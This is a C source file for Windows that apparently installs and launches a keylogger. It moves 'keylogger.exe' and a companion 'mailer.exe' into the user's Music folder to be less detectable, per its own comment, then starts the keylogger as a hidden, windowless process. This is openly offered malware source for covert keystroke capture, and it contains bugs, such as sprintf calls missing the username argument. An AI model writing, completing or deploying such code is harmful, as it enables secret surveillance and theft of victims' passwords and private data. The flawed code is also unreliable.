#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <process.h>

// GLOBALS //
#define BUF_SIZE 256 // general purpose for buffers

// FUNCTION DECLARATIONS //
void InstallKeylogger(char* keylogger_path, char* mailer_path); // 0 for fail, 1 for success
void ExecuteKeylogger(char* keylogger_path); 

// MAIN FUNCTION //
int main(){
    // get current directory
    char currentdir[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentdir);

    // create file path strings
    char keylogger_path[MAX_PATH];
    char mailer_path[MAX_PATH];
    sprintf(keylogger_path, "%s\\keylogger.exe", currentdir);
    sprintf(mailer_path, "%s\\mailer.exe", currentdir);

    // move keylogger and mailer to new directory
    InstallKeylogger(keylogger_path, mailer_path);
    ExecuteKeylogger(keylogger_path);
}

// FUNCTION DEFINITIONS //

// attempt to move the executables to another directory to be "less" detectable
void InstallKeylogger(char* keylogger_path, char* mailer_path){
    // get current user's name
    DWORD len = BUF_SIZE+1;
    char username[BUF_SIZE+1];
    GetUserName(username, &len);

    // build new file path
    char keylogger_new_path[MAX_PATH];
    sprintf(keylogger_new_path, "C:\\Users\\%s\\Music\\keylogger.exe");
    char mailer_new_path[MAX_PATH];
    sprintf(mailer_new_path, "C:\\Users\\%s\\Music\\mailer.exe");

    // attempt to execute in case of failure to install files in desired spot
    // move keylogger
    BOOL moved = MoveFile(keylogger_path, keylogger_new_path);
    
    // if moved successfully, move mailer
    if(moved){

        // move mailer
        BOOL moved2 = MoveFile(mailer_path, mailer_new_path);
        
        // if moved successfully, update paths
        if(moved2){
            strncpy(keylogger_path, keylogger_new_path, MAX_PATH);
            strncpy(mailer_path, mailer_new_path, MAX_PATH);
            return;
        }
        // if failed, move keylogger back and execute where it is
        else{
            MoveFile(keylogger_new_path, keylogger_path);
            return;
        }
        
    }
    // if failed, execute keylogger where it is
    else{
        return;
    }
}

// execute the keylogger given the updated file path
void ExecuteKeylogger(char* keylogger_path){
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcess(
        keylogger_path,
        NULL, NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    CloseHandle(&pi);
}